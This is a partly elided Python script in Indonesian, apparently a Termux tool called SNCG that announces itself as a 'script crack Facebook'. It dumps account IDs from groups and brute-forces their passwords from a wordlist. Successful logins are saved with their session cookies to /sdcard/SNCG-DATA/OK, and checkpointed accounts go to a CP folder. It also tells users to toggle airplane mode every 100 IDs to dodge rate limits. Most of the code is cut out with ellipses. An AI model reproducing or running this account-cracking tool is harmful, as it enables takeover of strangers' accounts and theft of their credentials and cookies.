...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mHello Indonesian People')
...
def banner():
	clear()
	wel='# SELAMAT DATANG DI SNCG SCRIPT'
...
• GITHUB : https://github.com/TigerCyberGaruda/•
...
def result():
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/SNCG-DATA/CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
			...
			try:geh = lol[geeh]
				...
				sol().print(mark(ric, style='red'))
				exit()
			try:lin = open('/sdcard/SNCG-DATA/CP/'+geh,'r').read().splitlines()
			except:
		...
		try:vin = os.listdir('/sdcard/SNCG-DATA/OK')
		except FileNotFoundError:
			gada = '# STORAGE NOT FOUND '
			sol().print(mark(gada, style='red'))
			time.sleep(2)
		...
		if len(vin)==0:
			...
			lol = {}
			for isi in vin:
				try:hem = open('/sdcard/SNCG-DATA/OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
...
def file():
	...
	my_files = []
	try:
		lis = os.listdir('/sdcard/SNCG-DATA/CP')
		for kt in lis:
			my_files.append(kt)
	except:pass
	try:
		mer = os.listdir('/sdcard/SNCG-DATA/OK')
		for ty in mer:
			my_files.append(ty)
	except:pass
	if len(my_files)==0:
		...
		try:geh = lol[geeh]
			...
			exit()
		try:
			hf = open('/sdcard/SNCG-DATA/1CP/'+geh,'r').readlines()
			for fz in hf:
				akun.append(fz.replace('\n',''))
			cek_opsi()
		except IOError:
			try:
				hf = open('/sdcard/SNCG-DATA/OK/'+geh,'r').readlines()
				for fz in hf:
					akun.append(fz.replace('\n',''))
				cek_opsi()
			except IOError:
...
def dump_grup():
	...
	try:
		...
		au = '# CEK JARINGANMU DAN MULAI KEMBALI'
	...
	if titt2=='Masuk Facebook':
		au = '# LIMIT MAINKAN MODE PESAWAT DAN MULAI KEMBALI'
...
def crack_file():
	...
	sol().print(mark(cek, style='green'))
	try:vin = os.listdir('/sdcard/SNCG-DATA/DUMP')
	except FileNotFoundError:
		gada = '# STORAGE NOT FOUND '
		sol().print(mark(gada, style='red'))
		time.sleep(2)
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/SNCG-DATA/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<10:
				nom = '0'+str(cih)
		...
		try:geh = lol[geeh]
			...
			sol().print(mark(ric, style='red'))
			exit()
		try:lin = open('/sdcard/SNCG-DATA/DUMP/'+geh,'r').read().splitlines()
		except:
			hehe = '# FILE NOT FOUND, CHECK AND TRY AGAIN'
			sol().print(mark(hehe, style='red'))
			time.sleep(2)
...
# WORDLIST
def passwrd():
	ler = '# CRACK SEDANG BERLANJUT, Tekan CTRL+Z UNTUK STOP'
	sol().print(mark(ler, style='green'))
	krek = '[•] HASIL CRACK TERSIMPAN DI : MEMORY-INTERNAL/SNCG-DATA/OK/%s\n[•] CP RESULTS SAVED IN : MEMORY-INTERNAL/SNCG-DATA/CP/%s\nAKTIKAN DAN MATIKAN MODE PESAWAT SETIAP 100 ID'%(okc,cpc)
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/SNCG-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					open('/sdcard/SNCG-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
...
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Aktifkan Mode Pesawat, Dan Mulai Kembali'%(c)
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s🔥 %s|%s 🔥 CP       %s'%(b,id,pw,x))
					print('\r%s[•] Pilih Opsi Dengan Benar%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
...
if __name__=='__main__':
	try:os.mkdir('/sdcard/SNCG-DATA/CP')
	except:pass
	try:os.mkdir('/sdcard/SNCG-DATA/OK')
	except:pass
	try:os.mkdir('/sdcard/SNCG-DATA/DUMP')
	except:pass
	voven_xd(f'\n\t{k}[+] {h}SELAMAT DATANG DI SCRIPT CRACK FACEBOOK FROM SNCG \n\t{k}[+] {k}JANGAN LUPA FOLLOW TIKTOK : @tigerskat\n\t{k}[+] {h}JIKA TERJADI SYNTX ERROR HUBUNGI SAYA\n\t{k}[+] {b}\n\t{k}[+] {u}FB : La Andre Jhi\n\t{k}[+] {h}IG : @tiger01_sky\n\t{k}[+] {k}WA : 081331369655\n\t{k}[+] {h}Github : https://github.com/TigerCyberGaruda\n\t{k}[+] {b}🥀SULTRA🥀\n\t{k}[+] {u}🤬BUTON TENGAH🤬\n\t{k}[+] {h}★CMD★\n\t{k}[+] {k}SEKIAN TERIMAKASIH\n\t{k}[+] {u}SEE YOU NEXT TIME ') 
	time.sleep(2) 
	login()
